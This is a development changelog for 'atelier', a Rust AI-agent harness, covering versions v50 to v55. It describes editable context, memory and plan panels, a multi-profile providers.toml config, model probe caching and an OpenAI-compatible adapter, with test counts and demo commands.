**§5 editable round-trips.** Closes the three `[~]` items in the §5 build tracker by adding the write-back path the panels were missing: pin / unpin / evict on context items, add / delete / promote on memory cards, add / status-cycle / constraint / reorder / remove on plan steps. The data layer (`ContextManager::{pin,unpin,evict}`, `MemoryStore::{add,evict,promote_to_global}`, `PlanCanvas::{add,mark_status,add_constraint,reorder,remove}`) was already pure-rust since v44; v55 wires it through the dispatcher to both UIs.

One pre-requisite refactor landed alongside: the Runner now owns a real `Arc<parking_lot::Mutex<ContextManager>>` populated as messages append, replacing the v53 `summarise_messages(&messages)` transcript projection. Pin / evict on a transcript projection have no semantics; pin / evict on the manager do.

### Plumbing (`atelier-core`)

- **`crates/atelier-core/src/context.rs`** — new `Provenance::AssistantTurn` variant + matching `ContextItemSummary` mapping (renders as `"assistant_turn"` per the existing GUI badge). Round-trip test added to the variants-roundtrip suite.

- **`crates/atelier-core/src/dispatcher.rs`** — `SessionDispatcher` gains three `Arc<parking_lot::Mutex<…>>` fields (`context_manager`, `memory_store`, `plan_canvas`) and a `with_shared_state(...)` builder. `new()` seeds each with a fresh empty instance so the unit-test surface is unchanged. 11 new mutator methods: `pin_context_item`, `unpin_context_item`, `evict_context_item`, `add_memory_card`, `delete_memory_card`, `promote_memory_card`, `add_plan_step`, `remove_plan_step`, `mark_plan_step_status`, `add_plan_step_constraint`, `reorder_plan_steps`. Each acquires the lock, calls the pure data-layer op, drops the lock, then re-emits the matching Snapshot event. `evict_context_item` additionally appends `LedgerEntry::cache_bust_from(&event)` to the ledger and emits `Event::LedgerAppended` so the cost meter ticks. 14 new tests covering happy path, idempotency, unknown-id error, and pinned-cannot-evict-without-ledger.

- **`crates/atelier-core/src/ledger.rs`** — `cache_bust_from`'s match exhausts the new `Provenance::AssistantTurn` variant (label `"assistant-turn"`).

### Runner (`atelier-cli`)

- **`crates/atelier-cli/src/runner.rs`** — `Runner::run` constructs `Arc<Mutex<ContextManager>>` / `Arc<Mutex<MemoryStore>>` / `Arc<Mutex<PlanCanvas>>` once and clones the Arcs into the `SessionDispatcher` via `with_shared_state(...)`. Each message append (user prompt at start, assistant after chat, tool result after dispatch) now also adds a `ContextItem` to the manager via three small private helpers: `context_item_for_user_prompt`, `context_item_for_assistant_turn`, `context_item_for_tool_result` (each maps to the right `Provenance` variant and tags `TokenSource::Approx` chars/4 counts). `Event::ContextItems` payload now comes from `context_manager.lock().summarise()` instead of `summarise_messages(&messages)`. The old projection + its 5 tests have been deleted; 4 new tests cover the helpers' provenance + token mapping.

### GUI

- **`crates/atelier-gui/src/lib.rs`** — 11 new Tauri commands mirror the dispatcher mutators (one per mutator), plus a `require_dispatcher(state)` helper that 404s when no run is in flight. `promote_memory_card` does the actual disk write under `~/.atelier/memory/<relative_path>` so the data layer stays I/O-free. Wire-format status strings (`"pending"` / `"in_progress"` / `"done"` / `"skipped"`) are parsed into `PlanStatus` via `parse_plan_status`; unknown labels are rejected rather than coerced. 2 new tests on the parser.

- **`crates/atelier-gui/ui/src/lib/components/ContextPane.svelte`** — per-row 📌/un-📌 toggle + ✕ evict button. The evict button opens an inline confirm card ("evict — frees ~N tokens. ledgered as cache-bust.") with confirm/cancel; confirm calls `evict_context_item` and surfaces "evicted — freed N tokens" in a 4-second toast.

- **`crates/atelier-gui/ui/src/lib/components/MemoryPane.svelte`** — top textarea + add button; per-row "↑ promote" and "✕" delete buttons. Promote shows "promoted → /path/to/file.md (N bytes)" in a toast.

- **`crates/atelier-gui/ui/src/lib/components/PlanPane.svelte`** — top text input + add button; per-row status cycler button (the glyph itself is the button — cycles `pending → in_progress → done → skipped → pending` on click), `↑` / `↓` reorder arrows, `+c` add-constraint (opens an inline form), `✕` remove.

### TUI

- **`crates/atelier-tui/src/lib.rs`** — `AppState` gains `focused_pane: FocusedPane`, `selected_context`/`selected_memory`/`selected_plan: usize`, and `input_mode: InputMode`. `FocusedPane::next()` is the Tab cycler. `InputMode` has three variants: `Normal`, `TextInput { kind: TextInputKind, buffer: String }`, `EvictConfirm { id: String }`. `handle_key`'s signature changed from `(KeyEvent, Option<&PendingApproval>)` to `(KeyEvent, &AppState)` so it can dispatch on focused pane + modal state. New keybindings (Normal mode): Tab cycles panes; `j`/`k` (or arrow keys) navigate within the focused pane. Per-pane mutator keys: Context = `p`/`u`/`e`; Memory = `a` (add modal) / `d` / `P`; Plan = `a` (add modal) / `space` (cycle status) / `c` (constraint modal) / `x`. Modal sub-modes grab keys before pane bindings — text-input modals append chars / backspace / Enter to submit / Esc to cancel; evict-confirm consumes `y` (confirm) / `n` or Esc (cancel). 12 new pure-fn unit tests on the keybind decoder + focus + select state. Mutations flow through a new private `submit_mutation` helper that mirrors `submit_pending`.

### Integration tests

- **`crates/atelier-cli/tests/run_integration.rs`** — 3 new end-to-end round-trips drive a scripted `MockAdapter` run, wait for the relevant snapshot event, invoke a dispatcher mutator via `DispatcherHandle::get()`, and assert that a follow-up snapshot reflects the change: `v55_pin_context_item_round_trips_through_dispatcher`, `v55_add_memory_card_round_trips_through_dispatcher`, `v55_mark_plan_step_done_round_trips_through_dispatcher`.

### Deferred (deliberately out of scope)

- Memory card in-place content edit (UI form-state machinery; add + delete + promote prove the round-trip).
- Plan drag-and-drop reorder (the up/down arrow path covers the contract; drag-and-drop is a separate §3 GUI-only checklist row).
- Non-destructive compaction / mental-model panel (separate §5 rows in the build tracker, untouched here).

## v54 — 2026-05-17

**§5 Memory panel.** Companion to v53's Context panel: cards on the bus, rendered in the top-right column of both UIs above what the agent is about to do (Plan) — Memory is what the agent knows long-term, Plan is what it's about to act on. The `MemoryStore` data layer was already in `atelier-core` since v44; v54 adds the bus projection (`MemoryCardSummary` + `Event::MemoryCards`), wires the Runner to publish a snapshot per turn boundary, and lands matching Svelte + ratatui panels. The Runner ships an empty card list today (no card source is wired yet — no add-card tool, no session-replay loader); the event surface is in place so any future card source is purely additive.

Plus a small README cleanup: §6 "Running against a local LLM" merged into the **Quick start** (which already showed the openai-compat one-liner) so users hit the local-LLM walkthrough at the top of the file instead of after the deeper configuration material.

### New surface

- **`crates/atelier-core/src/memory.rs`** — `MemoryCardSummary` flat projection of `MemoryCard`:
  - `title` = first non-empty line of `content` (markdown convention).
  - `body_preview` = remaining text, capped at `MEMORY_BODY_PREVIEW_CHARS = 200` with a trailing ellipsis when truncated.
  - `created_at`, `last_used`, `pinned` carried through verbatim.
  - `MemoryStore::summarise()` materialises the per-card list in insertion order.
  - 8 new tests cover title extraction (incl. leading-blank-line skip), preview truncation at the cap, empty/single-line edge cases, pinned + timestamp pass-through, insertion-order preservation, and serde round-trip.

- **`crates/atelier-core/src/session.rs`** — new `Event::MemoryCards { cards: Vec<MemoryCardSummary> }` variant. Emitted at the same turn boundary as `ContextItems` so the two §5 panels (context = per-turn, memory = durable) update coherently.

- **`crates/atelier-cli/src/runner.rs`** — per-run `MemoryStore::new()` (empty for now); `Event::MemoryCards { cards: memory_store.summarise() }` broadcast alongside `Event::ContextItems` after each turn. The empty snapshot is intentional — surfaces the "no memory cards yet" placeholder so the panel is visibly idle rather than indistinguishable from a broken render.

- **`crates/atelier-gui/`** — new Svelte `MemoryPane.svelte`:
  - One row per card: optional pin glyph (📌), title (bold), compact `YYYY-MM-DD HH:MM` "last used" badge on the right, two-line body preview clamped via `line-clamp: 2` (with `-webkit-line-clamp` for browser compatibility).
  - Tooltip carries full id + created/last-used timestamps so the panel surface stays compact.
  - Pinned rows get a subtle yellow accent — mirrors ContextPane.
  - Wired into `App.svelte`'s top-right slot stacked under `PlanPane` via a `plan-stack` CSS grid (`auto / 1fr` so Plan keeps fit-content height and Memory takes the flex space).
  - `bridge_event` projection passes `MemoryCardSummary` through `serde_json::to_value` (snake_case wire shape, directly renderable). 1 new bridge test.
  - `state.ts`: `MemoryCardSummary` type, `applyEvent` reducer arm (wholesale-replace policy mirroring `ContextItems`), `initialState.memoryCards: []`.

- **`crates/atelier-tui/`** — new `render_memory_pane`:
  - Top-right column split vertically 50/50 between Plan (top) and Memory (bottom) — mirrors the GUI's stack and keeps both §5 surfaces in the highest-visibility column.
  - Per row: pin glyph, title (bold + white when pinned), compact `YYYY-MM-DD HH:MM` last-used timestamp. Body preview deliberately omitted — the TUI row budget is tighter than the GUI's, and title + last-used are the high-value scanning fields.
  - `short_timestamp(iso)` helper trims ISO 8601 to date + hh:mm; tolerates non-ISO input by passing it through verbatim so a malformed timestamp is visible rather than dropped.
  - `AppState.memory_cards` field; `apply` arm with wholesale-replace; `project_event` arm yields `"MemoryCards N cards"` event-log line. 3 new tests.

### README cleanup

- **`README.md`** — §6 "Running against a local LLM" merged into **Quick start** as a subsection. The walkthrough (Ollama install + `--provider openai-compat --base-url …` invocation + other-servers table + probe-on-first-use note) now lives at the top of the file. §5 (Configure with providers.toml) stays where it is as the deeper configuration reference; the Quick start subsection links to it.

### Demo flow

```sh
$ atelier run "<prompt>"
…
# Bus emits, per turn:
#   ContextSnapshot { known_tokens, unknown_tokens }       (aggregate meter)
#   ContextItems { items: [system_prompt, user_message, …] }  (per-row Context panel)
#   MemoryCards { cards: [] }                              (per-row Memory panel — empty until a source wires in)

# GUI top-right column:
#   ┌─ Plan ──────┐
#   │ • step 1    │   plan canvas tree (existing v44)
#   │ • step 2    │
#   ├─ §5 Memory ─┤
#   │ no memory   │   empty state until a card source is wired
#   │   cards yet │
#   └─────────────┘

# TUI top-right column has the same split via Layout::default()
# .direction(Vertical).constraints([Percentage(50), Percentage(50)]).
```

### Verified

- `cargo fmt --check` clean.
- `cargo clippy --workspace --all-targets -- -D warnings` clean.
- `cargo test --workspace` → **atelier-core 506** (+8 from `memory::MemoryCardSummary`) + **atelier-cli 19** + **atelier-gui 15** (+1 bridge) + **atelier-tui 65** (+3 panel) = **605 passing**.
- `make check` — schemas + 52 artifacts + 112 rig tests + 11 dry-runs all OK.
- `npm run check` in `crates/atelier-gui/ui/` — 96 files (+1 `MemoryPane.svelte`), 0 errors, 0 warnings.
- `cargo doc --workspace --no-deps` emits 0 warnings.

### §5 mechanical gate status (post-v54)
- ✅ Context-panel API (v53)
- ✅ Mechanical gate: API assertions for token counts + why-here (v53) + cache-bust ledger entry on eviction (v44)
- ⏳ Pin / unpin / evict UI round-trip — data layer + render done; UI buttons + dispatcher round-trip deferred
- ✅ **Memory panel: editable cards + last-used + one-click promote** (v54 — view path; the "editable" + "one-click promote" UI round-trips land with the pin/unpin UI work)
- ⏳ Plan canvas editing
- ⏳ Non-destructive compaction; expansion gated with cost disclosure
- ⏳ Mental-model panel

## v53 — 2026-05-17

**`.atelier/providers.toml` (named profiles) + §5 Context panel.** Two pieces landed together: the v52 single-provider config is reshaped into a multi-profile TOML with a `default` selector and a `--profile` CLI flag, and the GUI + TUI gain a §5 Context panel showing per-item token counts + provenance ("why is this in my agent's head?"). The §5 panel ties off one of the few remaining stated Phase C mechanical gates (`API assertions for token counts and why-here; cache-bust ledger entry on eviction`).

### TOML format change — v52 `config.toml` → v53 `providers.toml`

**Breaking change** against the v52-introduced format. v52 was committed only days earlier and not in the wild, so this is a clean rewrite rather than a migration.

```toml
# .atelier/providers.toml

default = "local"

[providers.local]
provider = "openai-compat"
base_url = "http://localhost:11434/v1"
model    = "local:qwen2.5-coder:7b"

[providers.cloud]
provider = "anthropic"
model    = "anthropic:claude-opus-4-7"

[runner]
max_turns = 32

[probe]
policy = "auto"
```

What changed:

| v52 | v53 |
|---|---|
| `.atelier/config.toml` | `.atelier/providers.toml` |
| Single `[provider]` table | `[providers.<name>]` map + `default` selector |
| Field name `kind` | Field name `provider` |
| `--no-probe`/`--force-probe` only | adds `--profile <NAME>` |

Why: a real harness session often wants more than one provider on hand — local LLM for fast iteration, cloud-hosted Anthropic for hard reasoning, a vLLM cluster for production-flavoured runs. v52's single-provider shape forced editing the file (or all the CLI flags) on every switch. v53 keeps every profile in one file and switches between them with `--profile <NAME>`. The `default` field picks which profile applies when `--profile` isn't passed; per-field CLI flags (`--provider`, `--model`, `--base-url`, …) still override individual fields of the resolved profile.

### New surface

- **`crates/atelier-core/src/config.rs`** rewritten:
  - `ProvidersConfig` document: `default: Option<String>`, `providers: BTreeMap<String, ProviderProfile>`, plus top-level optional `[runner]` and `[probe]` sections. `serde(deny_unknown_fields)` everywhere.
  - `ProviderProfile` with `provider`/`model`/`base_url` fields (all optional so a half-populated profile can layer with CLI flags).
  - `ProvidersConfig::resolve_profile(cli_profile)` — CLI > `default` > none. Returns `Result<Option<(name, &profile)>, ConfigError>` so a typo in `--profile` lists the available profiles instead of falling through silently.
  - `validate()` enforces two cross-section invariants: `default` references an existing profile, and `base_url` requires `provider = "openai-compat"`. Each carries a path + a typed error.
  - 19 unit tests (up from 14) cover the user's example verbatim, kebab/lowercase wire forms, discovery, malformed-file rejection, missing-default-name rejection, missing-profile rejection, base_url+wrong-provider rejection, base_url-without-provider allowed (CLI may supply later), round-trip through serde, and the three resolution paths (CLI / default / neither).

- **`crates/atelier-cli/src/main.rs`** — new `--profile <NAME>` flag. `parse_cli` extended; `resolve_provider_choice` now takes a resolved `Option<&ProviderProfile>` instead of the v52 `Option<&ProviderSection>`. On every run the binary prints `atelier run: using config <path> (profile "<name>")` so the active resolution is visible.

### §5 Context panel — per-row "what's in my agent's head"

- **`crates/atelier-core/src/context.rs`** — new `ContextItemSummary` flat projection of `ContextItem`:
  - `kind`: `"file_ref"` / `"inline_text"` / `"blob_ref"`.
  - `label`: file path / first-80-chars-of-text-plus-ellipsis / sha-prefix.
  - `provenance` + optional `provenance_detail`: the why-here trace.
  - `tokens` + `token_source`: count and reliability label.
  - `ContextManager::summarise()` → `Vec<ContextItemSummary>` in insertion order.
  - 7 new tests cover each `Payload` variant's label shape, each `Provenance` variant's mapping, insertion-order preservation, and round-trip through serde.

- **`crates/atelier-core/src/session.rs`** — new `Event::ContextItems { items: Vec<ContextItemSummary> }` variant. Emitted at the same turn boundary as the existing `ContextSnapshot` so the aggregate meter denominator and the per-item rows stay coherent.

- **`crates/atelier-cli/src/runner.rs`** — `summarise_messages(&[Message]) -> Vec<ContextItemSummary>` helper. Maps each `Role` onto a provenance label (`System → initial`, `User → user_attached`, `Assistant → assistant_turn`, `Tool → tool_result` with the message's `tool_call_id` as `provenance_detail`). Token attribution is `chars/4` tagged `approx` — honest about being a rough number. Emitted alongside `ContextSnapshot` after each turn. 5 unit tests.

- **`crates/atelier-gui/`** — new Svelte `ContextPane.svelte` component renders rows with right-aligned token counts (cyan exact / yellow approx / dim unavailable), short provenance badges (`init`/`usr`/`tool`/`mem`/`pin`/`asst`), and the item label. Empty-state placeholder before the first event. Wired into `App.svelte`'s bottom-right slot stacked under the existing aggregate `MetersPane` (CSS grid `auto / 1fr` so meters keep fixed height; context takes the flex space). `bridge_event` projects `ContextItems` through `serde_json::to_value(ContextItemSummary)` so the webview gets the wire shape verbatim — no second mapping layer. 1 new bridge test.

- **`crates/atelier-tui/`** — new `render_context_pane` renders the same panel in the right column between the context gauge and the bounded event log tail. Pane title `§5 Context`; rows use the same colour palette as the GUI for cross-surface consistency. `AppState.context_items` is replaced wholesale on every `ContextItems` event (snapshots come at every turn boundary; a stale partial render is never preferable to the fresh snapshot). Constraint shape tightened to `[Length(2), Length(2), Min(2), Length(4)]` so the cost + context gauges keep their full 2-row allocation even in tight test areas. 5 new tests + project_event coverage.

### Demo flow

```sh
# v53 single-file, multi-profile config:
cat > .atelier/providers.toml <<EOF
default = "local"

[providers.local]
provider = "openai-compat"
base_url = "http://localhost:11434/v1"
model    = "local:qwen2.5-coder:7b"

[providers.cloud]
provider = "anthropic"
model    = "anthropic:claude-opus-4-7"
EOF

$ atelier run "add a hello() function"
atelier run: using config /Users/you/proj/.atelier/providers.toml (profile "local")
…
# Bus emits: ModelProfileLoaded { strategy: JsonSentinel, outcome: CacheHit }
# Bus emits: ContextItems { items: [system_prompt, user_message, assistant_turn, …] }

# Flip to cloud for one run, same file:
$ atelier run --profile cloud "now do the hard version"
atelier run: using config /Users/you/proj/.atelier/providers.toml (profile "cloud")
```

### Verified

- `cargo fmt --check` clean.
- `cargo clippy --workspace --all-targets -- -D warnings` clean.
- `cargo test --workspace` → **atelier-core 498** (+12 from v52: +7 ContextItemSummary, +5 resolver/discovery deltas) + **atelier-cli 19** (+5 summarise_messages) + **atelier-gui 14** (+1 bridge) + **atelier-tui 62** (+10 panel + project_event + layout) = **593 passing**.
- `make check` — schemas + 52 artifacts + 112 rig tests + 11 dry-runs all OK.
- `npm run check` in `crates/atelier-gui/ui/` — 95 files (+1 for `ContextPane.svelte`), 0 errors, 0 warnings.

### Rig counts
- **21 schemas / 52 artifacts / 112 tests / 11 dry-runs / 498 atelier-core unit tests + 19 atelier-cli integration tests + 14 atelier-gui unit tests + 62 atelier-tui unit tests** (atelier-core +12, atelier-cli +5, atelier-gui +1, atelier-tui +10 from v52).

### §5 mechanical gate status
- ✅ **API assertions for token counts** — `ContextItems` event ships per-item `tokens` + `token_source`, asserted in tests across all four crates.
- ✅ **API assertions for why-here per item** — `provenance` + `provenance_detail` ship in every row; mapped from `context::Provenance` (and `summarise_messages` for the runtime path); tests assert stable labels.
- ✅ **Cache-bust ledger entry on eviction** — landed in v44 (`ContextManager::evict` returns `CacheBustEvent`; `Ledger::cache_bust_from` writes it). Not new in v53, but the panel makes it visible.
- ⏳ **Pin / unpin / evict with cache-bust confirm** in the UI — data layer is there (`ContextManager::{pin, unpin, evict}`); the UI buttons are deferred.
- ⏳ **Memory panel** — separate work item.

## v52 — 2026-05-17

**`.atelier/config.toml` + model badge in the GUI/TUI footer.** Atelier's runtime knobs — which BYOM adapter, which model, which base URL, max turns, probe policy — now live in a small TOML file the binary picks up automatically. Per-repo override (committed) → user-scope fallback (`~/.atelier/config.toml`) → built-in defaults. CLI flags still win at the top. The GUI and TUI both render the active model id + §2 strategy + probe outcome in the bottom-right of their footer, so a glance tells you which provider you're talking to.

### New surface

- **`crates/atelier-core/src/config.rs`** (NEW, ~600 lines):
  - `AtelierConfig` document with three optional sections: `[provider]` (`kind`, `model`, `base_url`), `[runner]` (`max_turns`), `[probe]` (`policy`). Every field is `Option<T>` so a one-line config (`[provider] kind = "anthropic"`) is valid and inherits defaults for the rest.
  - `ProviderKind` enum (`Mock` / `Anthropic` / `OpenaiCompat`, kebab-case on the wire) and `ProbePolicyName` enum (`Auto` / `Skip` / `Force`, lowercase on the wire). Both derive `as_str()` for log lines + the UI status line.
  - `AtelierConfig::load(repo_root)` walks the path list: `<repo>/.atelier/config.toml` first, then `~/.atelier/config.toml`. Missing both is `Ok(None)` (not an error); a file that exists but doesn't parse is fatal (`ConfigError::Parse` with the file path) so a typo can't silently shift the runtime to defaults.
  - `AtelierConfig::paths_searched(repo_root)` mirrors the search list for "no config found, searched …" logging.
  - Cross-section validation: `[provider].base_url` requires `[provider].kind = "openai-compat"`. `ConfigError::Invalid` carries the file path + a typed message.
  - `serde(deny_unknown_fields)` on every struct so a typo'd `[provider].mod_el = "..."` is a parse error, not a silent fall-through.
  - 14 unit tests cover shape (every field optional, kebab/lowercase wire forms, unknown-field rejection), discovery (project before user, missing-both yields None), validation (`base_url` requires `openai-compat`; `base_url` without `kind` is allowed because CLI may supply `kind` later), round-trip through serde.

- **`crates/atelier-cli/src/main.rs`** — `run_run` refactored into a top-down narrative: parse argv → resolve workspace → load TOML → layer CLI > TOML > defaults → build Runner → run. New `CliArgs` struct holds raw `Option<T>` flags; new helpers `resolve_provider_choice`, `resolve_provider_kind`, `resolve_probe_policy`, `read_prompt_from_cli`. The binary prints `atelier run: using config <path>` so users can confirm which file is active. Usage text expanded with a config example block.

- **`crates/atelier-gui/ui/src/lib/state.ts`** — new `CurrentModel` type + `applyEvent` arm for `ModelProfileLoaded` populating `state.currentModel`. `projectEvent` adds a `ModelProfile` event-log line.

- **`crates/atelier-gui/ui/src/App.svelte`** — footer extended with a right-aligned `.model-badge` (CSS `margin-left: auto` flex idiom) rendering `model_id · strategy · outcome` with cyan id, green strategy, dim outcome. Falls back to `no model` placeholder before the first event.

- **`crates/atelier-gui/src/lib.rs`** — `bridge_event` for `ModelProfileLoaded` now serialises `outcome` via `serde_json::to_value(ProbeLoadOutcome)` so the wire shape is `snake_case` (`cache_hit` / `probed` / `reprobed` / `not_cached`) directly usable in the UI. Pre-v52 used `format!("{:?}").to_lowercase()` which produced `cachehit`.

- **`crates/atelier-tui/src/lib.rs`** — new `CurrentModel` struct on `AppState`. `apply` populates it from `ModelProfileLoaded`. `render_help` split into `render_help_left` + `render_help_right_model` + `model_badge_width` so the layout split between scrub keys (left, flexible) and the model badge (right, fixed-width) is one ratatui `Layout::default().direction(Horizontal).constraints([Min(0), Length(badge_width)])`. The pending-approval banner suppresses the badge so the approval prompt is the unambiguous focus.

- **`crates/atelier-tui/src/lib.rs`** — new `snake_case_debug` helper inserts underscores at camel-case boundaries so the TUI's `outcome` label matches the GUI's `serde(rename_all = "snake_case")` projection byte-for-byte.

### Demo flow

```sh
# One-time: pin the local LLM defaults for this repo.
cat > .atelier/config.toml <<EOF
[provider]
kind     = "openai-compat"
base_url = "http://localhost:11434/v1"
model    = "local:qwen2.5-coder:7b"
EOF

# Now every invocation only needs a prompt:
$ atelier run "add a hello() function"
atelier run: using config /Users/you/proj/.atelier/config.toml
…

# GUI footer (bottom-right):
#   local:qwen2.5-coder:7b · json_sentinel · cache_hit

# TUI footer (right of the help line):
#    q/Esc/Ctrl-C quit · [ prev · ] next · g HEAD     local:qwen2.5-coder:7b · json_sentinel · cache_hit
```

### CLI override layering (top wins)

```text
  1. CLI flags                         (per-invocation overrides)
  2. <repo>/.atelier/config.toml       (project scope)
  3. ~/.atelier/config.toml            (user scope)
  4. Built-in defaults                 (mock, 32 turns, auto probe)
```

### Verified

- `cargo fmt --check` clean.
- `cargo clippy --workspace --all-targets -- -D warnings` clean.
- `cargo test --workspace` → **atelier-core 486** (+14 from `config`) + **atelier-cli 14** + **atelier-gui 13** (+1 from the new `bridge_event` test) + **atelier-tui 52** (+6 from the model-badge tests) = **565 passing**.
- `make check` — schemas + 52 artifacts + 112 rig tests + 11 dry-runs all OK.
- `npm run check` in `crates/atelier-gui/ui/` — 94 files, 0 errors, 0 warnings.

### Rig counts
- **21 schemas / 52 artifacts / 112 tests / 11 dry-runs / 486 atelier-core unit tests + 14 atelier-cli integration tests + 13 atelier-gui unit tests + 52 atelier-tui unit tests** (atelier-core +14, atelier-gui +1, atelier-tui +6 from v51).

## v51 — 2026-05-17

**Probe-on-first-use model adaptation (§1).** Atelier now fires a short calibration round-trip the first time it encounters a new `(model_id, base_url)` pair, observes whether the model handles native tool calls and JSON-sentinel envelopes, picks the appropriate §2 strategy, and caches the result to `~/.atelier/model_profiles/<hash>.json` so subsequent runs skip the probe. The cached profile is emitted on the bus as a new `Event::ModelProfileLoaded` so the GUI and TUI can render the active strategy badge. The Anthropic and Mock adapters skip the probe (they're well-characterised); only `openai-compat` is probed by default. CLI flags `--no-probe` and `--force-probe` override.

### New surface

- **`crates/atelier-core/src/adapter/model_profile.rs`** (NEW, ~900 lines):
  - `ModelProfile` struct: schema-versioned on-disk shape with model_id, base_url, probed_at, strategy, supports_native_tools, supports_streaming, utf8_clean, context_window_tokens, max_tokens, notes. Atomic `save_to` / `load_from` mirror `persistence.rs` idioms (tempfile + persist + fsync_dir_best_effort); load rejects mismatched `PROFILE_SCHEMA_VERSION` with `ProfileError::IncompatibleVersion`.
  - `ProbeObservation` struct + `decide_strategy(&obs) -> Strategy` pure function. Preference order: `NativeTool > JsonSentinel > RegexProse`. Eight branch tests lock the decision rule.
  - `probe_model(adapter)` async driver: fires two calibration calls — (A) ask the model to invoke a `harness_calibration_echo` tool with `{"value": "ok"}` and check round-trip, (B) ask for an exact `<<<harness_meta>>>{"claimed_done":true}<<<end>>>` and parse with `parse_json_sentinel`. UTF-8 cleanliness (U+FFFD detection) recorded as a side signal. Fatal adapter errors (`Auth`, `NotConfigured`, `Unreachable`, `ContextOverflow`) propagate; transient errors (`Malformed`, `Provider`, `RateLimited`) record a note and the strategy flag stays `false`.
  - `ProfileStore` cache: `user_default()` honours `ATELIER_PROFILE_DIR` then `~/.atelier/model_profiles/`. `load_or_probe(adapter, base_url, force_reprobe, probed_at)` is the entry point — returns `(ModelProfile, ProbeLoadOutcome)` where the outcome distinguishes `CacheHit / Probed / Reprobed / NotCached`. Best-effort persistence: a save failure downgrades the outcome to `NotCached` but never fails the run. 34 unit tests cover save/load round-trip, version-mismatch rejection, cache hit doesn't call adapter, force-reprobe overwrites, stale-schema reprobes, ephemeral store, fatal probe error doesn't leave stale state on disk.
  - Cache key: `sha256(model_id || "\n" || base_url)[..16]` (64 bits) — stable, collision-resistant against the `("ab", "cd")` vs `("a", "bcd")` ambiguity (test `cache_path_does_not_collide_via_concat_ambiguity`).
- **`crates/atelier-core/src/session.rs`** — new `Event::ModelProfileLoaded { model_id, base_url, strategy, outcome }` variant. Emitted by the Runner once, after the probe step resolves, before the first turn. UI consumers render a "strategy badge" off it.
- **`crates/atelier-cli/src/runner.rs`** — new `ProbePolicy::{Auto, Skip, Force}` enum and `Runner::with_probe_policy` builder. `Runner::new` sets per-provider defaults: `Mock` and `Anthropic` → `Skip` (well-known); `OpenAiCompat` → `Auto` (cache-first, probe on miss). The Runner's `run()` resolves a `ModelProfile` before the turn loop and broadcasts `Event::ModelProfileLoaded`. A probe failure logs a warning and falls back to a stub profile so the run continues — the §1 conformance tracker still drives runtime strategy selection.
- **`crates/atelier-cli/src/main.rs`** — `--no-probe` and `--force-probe` CLI flags. Mutually exclusive (exit 2 on both). Usage text updated.
- **`crates/atelier-gui/src/lib.rs`** — `bridge_event` adds a `ModelProfileLoaded` projection so the webview can render the badge.
- **`crates/atelier-tui/src/lib.rs`** — `project_event` adds a `ModelProfile` event line; `apply` includes the variant in the no-op set (informational, doesn't change pane state).

### What the probe *does* and *doesn't* change in v51

- **Does:** populate a cached `ModelProfile` per `(model_id, base_url)`, broadcast it on the bus, log the cache-hit / probe outcome, and surface strategy guidance to UIs.
- **Doesn't yet:** rewire the adapter's initial strategy from the cached value. The adapter still picks its own strategy at construction time; the §1 conformance tracker degrades from there at runtime if the model misbehaves. Threading `profile.strategy` into the adapter as an initial-strategy hint is a v52 follow-on — the present commit lands the observation layer with all the cache + invariants in place, so v52 is a one-call wiring change.

### Demo flow

```text
$ cargo run -p atelier-cli -- run --provider openai-compat \
    --base-url http://localhost:11434/v1 --model local:qwen2.5-coder:7b \
    "add a hello function"

# First run — probe round-trips:
[INFO atelier::probe] model profile probed and cached
    model_id=local:qwen2.5-coder:7b base_url=http://localhost:11434/v1
    strategy=json_sentinel cache_path=~/.atelier/model_profiles/<hash>.json
    forced=false
# Bus emits: ModelProfileLoaded { strategy: JsonSentinel, outcome: Probed }

# Second run — cache hit:
[INFO atelier::probe] model profile cache hit
    strategy=json_sentinel
# Bus emits: ModelProfileLoaded { strategy: JsonSentinel, outcome: CacheHit }

# Force re-probe (e.g., after a model upgrade):
$ cargo run -p atelier-cli -- run --provider openai-compat \
    --base-url http://localhost:11434/v1 --model local:qwen2.5-coder:7b \
    --force-probe "..."
# Bus emits: ModelProfileLoaded { strategy: ?, outcome: Reprobed }
```

### Verified

- `cargo fmt --check` clean.
- `cargo clippy --workspace --all-targets -- -D warnings` clean.
- `cargo test --workspace` → **atelier-core 472** (was 438; +34 from `adapter::model_profile`) + **atelier-cli 14** + **atelier-gui 12** + **atelier-tui 46** = **544 passing**.
- `make check` — schemas + 52 artifacts + 112 rig tests + 11 dry-runs all OK.

### Rig counts
- **21 schemas / 52 artifacts / 112 tests / 11 dry-runs / 472 atelier-core unit tests + 14 atelier-cli integration tests + 12 atelier-gui unit tests + 46 atelier-tui unit tests** (atelier-core +34 from v50).

### §1 capability/conformance status
- **Adapter trait surface**: `chat`, `stream`, `count_tokens`, `capabilities`, `conformance` — all live since v38.
- **Conformance ring buffer + degradation** (§2): live since v15.
- **Capability matrix as machine-readable config**: deferred — the static-table approach (option 1 of the v51 design discussion) is a separate path that would land a `capabilities.toml` lookup before construction. Probe-on-first-use is the dynamic counterpart; both can coexist.
- **"Claimed-but-broken" column**: surfaced via `CapabilityClaim::ClaimedButBroken`; the probe doesn't write this yet — it records observations directly. A v52 cross-walk between `ProbeObservation` and `CapabilityClaim` is the natural next step.

## v50 — 2026-05-17

**OpenAI-compatible adapter lands + v49 LOW residuals closed.** Atelier now talks to any server speaking `POST /v1/chat/completions` — LM Studio, llama.cpp's `llama-server`, vLLM, sglang, Ollama (via its `/v1/` compat layer), and OpenAI itself. Pair with the existing Anthropic adapter and the `Mock` for tests, that's three of the four §1 BYOM providers in. Companion to the adapter: four v49 LOW residuals (LR-1..4) cleaned up from the rescan.

### v50 features

- **`crates/atelier-core/src/adapter/openai_compat.rs`** (NEW, ~870 lines). `OpenAiCompatAdapter` implements `Adapter` end-to-end:
  - `chat()` — non-streaming, single round-trip to `<base_url>/chat/completions`. Tool calls are surfaced through OpenAI's `tool_calls` array (each `function.arguments` is a JSON-encoded string on the wire, which the adapter parses back into `serde_json::Value` for `ToolCallRequest::arguments`). `finish_reason` mapped to `StopReason` (`stop`→`EndTurn`, `length`→`MaxTokens`, `tool_calls`→`ToolUse`, `content_filter`→`Refusal`).
  - `stream()` — SSE parser mirroring `anthropic.rs`'s line-buffered state machine: handles `\r\n`/`\n`/`\r`, UTF-8 decoded only on complete events, `[DONE]` terminator recognised, 8 MB buffer cap. Tool-call deltas keyed by `index` so fragmented JSON across multiple SSE frames re-assembles correctly; arguments parsed once at finish.
  - `count_tokens()` — chars/4 approximation tagged `TokenSource::Approx` (no server-side counter exists for the compat protocol; ContextManager treats this as fallback).
